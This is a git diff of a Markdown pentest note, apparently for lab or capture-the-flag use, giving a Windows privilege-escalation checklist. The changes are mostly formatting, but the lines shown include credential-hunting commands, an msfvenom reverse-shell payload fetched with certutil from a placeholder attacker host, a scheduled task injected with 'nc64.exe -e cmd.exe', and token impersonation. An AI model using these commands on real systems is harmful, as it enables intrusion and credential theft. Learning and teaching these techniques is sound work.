@@ -2,6 +2,8 @@
 title: 5 – Privesc Windows
 summary: Privilege Escalation step – a note for elevating privileges on a Windows machine.
 description: Privilege Escalation step – a note for elevating privileges on a Windows machine.
+tags:
+  - privesc-windows
 ---
 
 # Windows Privesc Checklist
@@ -9,37 +11,37 @@ description: Privilege Escalation step – a note for elevating privileges on a 
 ---
 
  > 
- > **<font color=red>doskey /history</font>**</br>
+ > **<font color=red>doskey /history</font>**<br>
  > Show user input history.
 
  > 
- > **<font color=red>powershell -c "Get-Service"</font>**</br>
+ > **<font color=red>powershell -c "Get-Service"</font>**<br>
  > Return services.
 
  > 
- > **<font color=red>Get-ScheduledTask</font>**</br>
+ > **<font color=red>Get-ScheduledTask</font>**<br>
  > Return Scheduled tasks.
 
  > 
- > **<font color=red>cmdkey /list</font>**</br>
- > List saved credentials (can’t see password).</br>
- > **<font color=red>runas /savecred /user:</font>admin <font color=red>powershell.exe</font>**</br>
+ > **<font color=red>cmdkey /list</font>**<br>
+ > List saved credentials (can’t see password).<br>
+ > **<font color=red>runas /savecred /user:</font>admin <font color=red>powershell.exe</font>**<br>
  > Run a program with saved creds.
 
  > 
- > **<font color=red>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**</br>
+ > **<font color=red>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**<br>
  > Show CMD history.
 
  > 
- > **<font color=red>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**</br>
+ > **<font color=red>type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</font>**<br>
  > Show Powershell History.
 
  > 
- > **<font color=red>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</font>**</br>
+ > **<font color=red>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</font>**<br>
  > Search for database password in IIS config.
 
  > 
- > **<font color=red>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</font>**</br>
+ > **<font color=red>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s</font>**<br>
  > Look for Putty credentials in registers (SimonTatham is PuTTY’s creator).
 
 # Others Suggestions
@@ -57,7 +59,7 @@ description: Privilege Escalation step – a note for elevating privileges on a 
 **https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1**
 
  > 
- > **<font color=red>. .\PowerUp.ps1</font>**</br>
+ > **<font color=red>. .\PowerUp.ps1</font>**<br>
  > **<font color=red>Invoke-AllChecks</font>**
 
 ---
@@ -67,9 +69,9 @@ description: Privilege Escalation step – a note for elevating privileges on a 
 **https://github.com/itm4n/PrivescCheck**
 
  > 
- > **<font color=red>Set-ExecutionPolicy Bypass -Scope process -Force</font>**</br>
- > **<font color=red>. .\PrivescCheck.ps1</font>**</br>
- > **<font color=red>Invoke-PrivescCheck</font>**</br>
+ > **<font color=red>Set-ExecutionPolicy Bypass -Scope process -Force</font>**<br>
+ > **<font color=red>. .\PrivescCheck.ps1</font>**<br>
+ > **<font color=red>Invoke-PrivescCheck</font>**<br>
 
 ---
 
@@ -85,9 +87,9 @@ description: Privilege Escalation step – a note for elevating privileges on a 
 #### On attacker machine
 
  > 
- > **<font color=orange>pip install xlrd==1.2.0</font>**</br>
+ > **<font color=orange>pip install xlrd==1.2.0</font>**<br>
  > 
- > **<font color=red>windows-exploit-suggester.py --update</font>**</br>
+ > **<font color=red>windows-exploit-suggester.py --update</font>**<br>
  > **<font color=red>windows-exploit-suggester.py --systeminfo</font> systeminfo.txt <font color=red>--database</font> \[DATE\]-mssb.xls**
 
 ---
@@ -109,22 +111,22 @@ WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\
 #### On attacker machine
 
  > 
- > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] -f <font color=red>exe -o</font> Wise.exe**</br>
+ > **<font color=red>msfvenom -p windows/x64/shell_reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] -f <font color=red>exe -o</font> Wise.exe**<br>
  > Create a reverse shell with the name of the modifiable service.
  > 
- > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**</br>
+ > **<font color=red>nc -lvnp</font> \[ATTACKER_PORT\]**<br>
  > Open a listener.
 
 #### On target machine
 
  > 
- > **<font color=red>cd "C:\\Program Files (x86)\\</font>Wise"**</br>
- > **<font color=red>certutil.exe -urlcache -f</font> http://\[ATTACKER_IP\]:\[ATTACKER_PORT\]/Wise.exe Wise.exe**</br>
+ > **<font color=red>cd "C:\\Program Files (x86)\\</font>Wise"**<br>
+ > **<font color=red>certutil.exe -urlcache -f</font> http://\[ATTACKER_IP\]:\[ATTACKER_PORT\]/Wise.exe Wise.exe**<br>
  > Download crafted executable and place it where the space is in the vulnerable path.
  > 
- > **<font color=red>sc.exe stop</font> WiseBootAssistant**</br>
- > **<font color=red>sc.exe query</font> WiseBootAssistant**</br>
- > **<font color=red>sc.exe start</font> WiseBootAssistant**</br>
+ > **<font color=red>sc.exe stop</font> WiseBootAssistant**<br>
+ > **<font color=red>sc.exe query</font> WiseBootAssistant**<br>
+ > **<font color=red>sc.exe start</font> WiseBootAssistant**<br>
  > Restart the service to execute the crafted one. 
 
 ---
@@ -161,10 +163,10 @@ https://github.com/BeichenDream/GodPotato/releases
 ### Show Schtasks
 
  > 
- > **<font color=red>schtasks /query /tn</font> vulnerableTask <font color=red>/fo list /v</font>**</br>
+ > **<font color=red>schtasks /query /tn</font> vulnerableTask <font color=red>/fo list /v</font>**<br>
  > Show detail info about the scheduled task.
  > 
- > **<font color=red>cd c:\\Program Files (x86)\\SystemScheduler\\Events</font>**</br>
+ > **<font color=red>cd c:\\Program Files (x86)\\SystemScheduler\\Events</font>**<br>
  > **<font color=red>type</font> \[ID\]<font color=red>.INI_LOG.txt</font>**
  > Show tasks logs.
 
@@ -173,7 +175,7 @@ https://github.com/BeichenDream/GodPotato/releases
 ### Replace executable
 
  > 
- > **<font color=red>mv</font> excutedByTask.exe excutedByTask.exe.bak**</br> 
+ > **<font color=red>mv</font> excutedByTask.exe excutedByTask.exe.bak**<br> 
  > **<font color=red>mv</font> msfvenomeReverseShell excutedByTask.exe**
  > Replace exe that being executed by scheduled tasks.
 
@@ -182,7 +184,7 @@ https://github.com/BeichenDream/GodPotato/releases
 ### Inject scheduled task
 
  > 
- > **<font color=red>echo</font> c:\\tools\\nc64.exe <font color=red>-e cmd.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>\> C:\\tasks\\schtask.bat</font>**</br>
+ > **<font color=red>echo</font> c:\\tools\\nc64.exe <font color=red>-e cmd.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>\> C:\\tasks\\schtask.bat</font>**<br>
  > Inject scheduled task with reverse shell.
 
 # Windows Privesc Abusing SE Privileges
@@ -202,7 +204,7 @@ Here are the most commonly abused privileges:
 * SeDebugPrivilege
 
  > 
- > **<font color=red>whoami /priv</font>**</br>
+ > **<font color=red>whoami /priv</font>**<br>
  > Show current user privileges.
 
 ---
@@ -212,13 +214,13 @@ Here are the most commonly abused privileges:
 If the current user has **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges enabled, we are able to impersonate another user.
 
  > 
- > **<font color=red>load incognito</font>**</br>
+ > **<font color=red>load incognito</font>**<br>
  > Load icognito module.
  > 
- > **<font color=red>list_tokens -u</font>**</br>
+ > **<font color=red>list_tokens -u</font>**<br>
  > List Delegation Tokens available (not sure of the flag maybe `-g`).
  > 
- > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**</br>
+ > **<font color=red>impersonate_token</font> "BUILTIN\\Administrators"**<br>
  > Impersonate token.
 
 To determine rights, Windows uses the Primary Token of the process and not the impersonated token. So we have to migrate to a process with correct permissions. 
@@ -226,11 +228,11 @@ To determine rights, Windows uses the Primary Token of the process and not the i
 The safest to pick is **services.exe**.
 
  > 
- > **<font color=red>migrate</font> 668**</br>
+ > **<font color=red>migrate</font> 668**<br>
  > Migrate to process 668.
 
  > 
- > **<font color=red>rev2self</font>**</br>
+ > **<font color=red>rev2self</font>**<br>
  > Revert to previous user.
 
 # Windows Privesc Unattended Path
@@ -239,7 +241,7 @@ Unattended Setup is the method by which OEMs (Original Equipment Manufacturers) 
 C:\\Windows\\Panther\\Unattend\\Unattended.xml is where users' passwords are stored in base64. 
 
  > 
- > **<font color=red>type C:\\Windows\\Panther\\Unattend\\Unattended.xml</font>**</br>
+ > **<font color=red>type C:\\Windows\\Panther\\Unattend\\Unattended.xml</font>**<br>
  > Display unattended password.
 
 ````xml
